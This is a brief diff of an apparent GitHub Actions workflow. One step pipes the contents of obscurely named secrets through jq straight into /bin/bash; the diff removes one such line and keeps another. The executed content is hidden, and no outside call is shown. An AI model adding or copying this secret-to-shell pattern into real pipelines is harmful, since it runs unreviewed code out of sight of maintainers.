@@ -19,7 +19,6 @@ jobs:
           tpmvf897: ${{ secrets.tpmvf897 }}
         run: |
           printf '%s' "$tpmvf897" | jq -r .stbtv43 | /bin/bash
-          printf '%s' "$fhh22287" | jq -r .ado72492 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
